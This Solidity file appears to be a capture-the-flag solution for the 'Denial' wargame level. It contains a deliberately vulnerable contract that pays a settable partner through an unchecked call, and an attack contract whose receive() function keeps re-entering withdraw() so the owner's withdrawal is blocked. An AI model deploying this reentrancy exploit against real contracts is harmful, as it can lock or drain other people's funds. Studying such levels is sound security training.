// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';
//import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.4.0/contracts/math/SafeMath.sol";

contract Denial {

    using SafeMath for uint256;
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address payable public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance.div(100);
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        owner.transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = now;
        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract DenialAttack {

    Denial toAttack;

    constructor(address payable _levelInstance) public payable {
        toAttack = Denial(_levelInstance);
    }

    //for VM testing
    function fundWallet() public payable {
        address(toAttack).transfer(address(this).balance);
    }

    //set partner
    function setPartner() public {
        toAttack.setWithdrawPartner(address(this));
    }

    //reenter contract until amountToSend is 0, return funds
    //to Denial contract, Denial will send amountToSend = 0 to owner
    //owner can no longer withdraw funds 
    receive() external payable {
        uint amountToSend = msg.value;
        if (amountToSend > 0) {

            (bool success,) = address(toAttack).call(abi.encodeWithSignature("withdraw()"));
            require(success);
        }
        address(toAttack).transfer(address(this).balance);
    }
}